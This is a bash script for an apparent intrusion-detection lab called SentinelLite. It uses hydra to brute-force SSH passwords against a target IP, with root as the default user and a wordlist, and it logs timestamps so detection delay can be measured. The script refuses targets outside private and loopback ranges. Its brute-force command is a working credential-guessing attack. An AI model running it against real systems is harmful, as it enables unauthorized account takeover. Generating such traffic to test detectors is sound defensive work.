#!/usr/bin/env bash
# SSH brute-force simulation for the SentinelLite lab. Run it on the ATTACKER machine.
#
#   attack-ssh-bruteforce.sh TARGET_IP [USER] [WORDLIST]
#
# ONLY against machines you own: the target must be a private (RFC 1918 / loopback) address, the
# script refuses anything else. It prints timestamps so the detection delay can be measured
# (lab/scripts/detection-delay.sh).
set -euo pipefail

target="${1:-}"
user="${2:-root}"
wordlist="${3:-$(dirname "${BASH_SOURCE[0]}")/../wordlists/small.txt}"

[ -n "$target" ] || { echo "usage: $0 TARGET_IP [USER] [WORDLIST]" >&2; exit 64; }
if ! [[ "$target" =~ ^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.|127\.) ]]; then
  echo "refusing: $target is not a private address. This script is for your own lab only." >&2
  exit 1
fi
[[ "$target" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || { echo "TARGET_IP must be an IPv4 address" >&2; exit 64; }
command -v hydra >/dev/null || { echo "hydra is not installed: sudo apt install -y hydra" >&2; exit 69; }
[ -r "$wordlist" ] || { echo "cannot read wordlist $wordlist" >&2; exit 66; }

now_ms() { date +%s%3N; }  # GNU date: milliseconds since the epoch

echo "target=$target user=$user attempts=$(wc -l < "$wordlist")"
echo "attack_start_ms=$(now_ms)"
# 4 parallel tasks; without -f hydra tries the whole list even after a success
hydra -l "$user" -P "$wordlist" -t 4 -w 5 "ssh://$target" || true
echo "attack_end_ms=$(now_ms)"
